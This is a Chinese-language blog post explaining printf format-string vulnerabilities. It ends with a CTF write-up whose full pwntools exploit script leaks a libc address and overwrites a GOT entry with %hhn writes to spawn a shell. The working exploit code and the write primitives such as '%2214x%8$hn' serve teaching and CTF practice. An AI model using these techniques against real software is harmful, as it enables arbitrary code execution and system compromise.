---
title: printf格式化漏洞
date: 2017-08-04 20:35:18
categories: pwn
tags: c++
---

### 1. 格式化字符串漏洞基本原理

格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是printf、sprintf、fprintf等print家族函数。介绍格式化字符串原理的文章有很多，我这里就以printf函数为例，简单回顾其中的要点。

> printf("format", arg1, arg2, ...)

其第一个参数为格式化字符串，用来告诉程序以什么格式进行输出！然后是参数1（偏移1），参数2（偏移2），...

下面是两张详细的说明图：
![printf_stack.png](/images/2017-08-04/printf_stack.png)

![printf_stack2.png](/images/2017-08-04/printf_stack2.png)

### 2. 格式化漏洞测试

写出一下printf函数

> printf("%8$x1234");

gdb调试该程序，最后展示栈内容，得到如下图：

![stack_value](/images/2017-08-04/stack_value.jpg)

打印结果：
> 12341234

<font color=#f00>说明：
A、8$ 表示栈空间从format string算起，偏移量为8的那个栈位置，在上图中format string对应的是地址0xffffd234，值为0x0804b438；而偏移为8的位置为0xffffd250，值为0x34333231("1234")，最终会输出的是偏移8地址上的值"1234"
B、如果将上面的format换成%8$s1234，那么就相当于打印0x34333231处的字符串。而如果此处为funA@got地址，那么输出的字符串就会是funA的执行地址
C、对于密码，输入“%2214x%8$hn”，其中，2214是0x8a6的10进制，而%8$hn表示将前面输出的字符数（即2214）写入偏移8处储存的栈地址所指向空间的低两字节处，即修改0x0d74为0x08a6；若用n，则%2214x需改为%4196518x，即需要输出4196518个字符，开销太大，特别是在远程攻击时，很可能导致连接断掉。
</font>

### 3.基本的格式化字符串参数

* %c：输出字符，配上%n可用于向指定地址写数据。
* %d：输出十进制整数，配上%n可用于向指定地址写数据。
* %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。
* %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。
* %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。
* %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。
* %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据

<font color=#f00>下面的结论是我最近的发现，是在调试逐渐加深理解的。printf("1234%n")：[偏移1]=4。也即修改的其实是栈上保存的地址中的值。如下图所示:</font>

![printf_stack3.png](/images/2017-08-04/printf_stack3.png)

格式化字符串漏洞发生在**栈中**，利用方式以下几种：

1. 修改变量的值，绕过认证
2. 覆写GOT表
3. 修改栈中保存的返回地址

而之所以可以这样修改，全是因为字符串被保存在在了栈中。若格式化字符串`buf`存储在**堆中**，也就是说我们输入的内容不会出现在栈里，那就不能通过向栈中写入地址的方式进行攻击，不过可以利用栈中**已有的值**进行攻击。

### 4. 实验测试

#### 4.1 CCTF-pwn3

本题只有NX一个安全措施，且为32位程序。

通过IDA逆向及初步调试，可以知道以下两点。

用户名是“sysbdmin”字符串中每个字母的ascii码减1，即rxraclhm；

在打印（即get功能，sub_080487F6函数）put（本程序功能，不是libc的puts）上去的文件内容时存在格式化字符串漏洞，且格式化字符串保存在栈中，偏移为7。

主要利用思路就是先通过格式化字符串漏洞泄露出libc版本，从而得到system函数调用地址；然后将该地址写到puts函数GOT表项中，由于程序dir功能会调用puts，且调用参数是用户可控的，故当我们以“/bin/sh”作为参数调用puts（也就是dir功能）时，其实就是以“/bin/sh”为参数调用system，也就实现了getshell。

```
# -*- coding: utf-8 -*-
#/usr/bin/env python

from pwn import *

elf = ELF('pwn3')
libc = ELF('/lib32/libc.so.6')
plt_puts = elf.symbols['puts']
print 'plt_puts= ' + hex(plt_puts)
got_puts = elf.got['puts']
print 'got_puts= ' + hex(got_puts)
p = process('./pwn3')

username = 'rxraclhm'

def put(pr, name, content):
    pr.recvuntil("ftp>")
    pr.sendline('put')
    pr.recvuntil("upload:")
    pr.sendline(name)
    pr.recvuntil("content:")
    pr.sendline(content)

def get(pr, name, num):
    pr.recvuntil("ftp>")
    pr.sendline('get')
    pr.recvuntil('get:')
    pr.sendline(name)
    return pr.recvn(num)

def dir(pr):
    pr.recvuntil("ftp>")
    pr.sendline('dir')

def edit_func(name, address, num):
    num = num & 0xff
    if num == 0 : num == 0x100
    payload = '%' + str(num) + 'c%10$hhn'
    payload = payload.ljust(12, 'A')
    put(p, name, payload + p32(address))
    get(p, name, 0)

def main():
    '''
    gdb.attach(p, """
        B * 0x080488A4
        """)
    '''
    p.readuntil("Name (ftp.hacker.server:Rainism):")
    p.sendline(username)
    put(p, "/sh", "%8$s"+p32(got_puts))
    text = get(p, "/sh", 4)
    puts_addr = u32(text)
    print 'puts_addr= ' + hex(puts_addr)
    system_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
    print 'system_addr= ' + hex(system_addr)

    edit_func('n', got_puts, system_addr)
    edit_func('i', got_puts+1, system_addr>>8)
    edit_func('b', got_puts+2, system_addr>>16)
    edit_func('/', got_puts+3, system_addr>>24)

    dir(p)
    p.interactive()
    pass

if __name__ == '__main__':
    main()
```

代码写的有点冗余，但主要的思路还是比较清晰：

> leak system_addr => write system_addr to puts@got => concat the /bin/sh => system('/bin/sh')

题目算是没什么坑的fmt的题，个人觉得这些题还是有以下解题技巧：

1.函数封装的好，能够节省很多时间；

2.使用%10$x这样的形式确定参数的偏移，使用%10\$s这样的形式泄露特定地址数据，使用%c %n的组合拳来改写数据；

3.尽量使用%hn和%hhn，避免过多的返回；

4.最好在每次使用%n修改地址后，使用%s去确认一下修改是否成功，对于新手而言能节省大量的时间。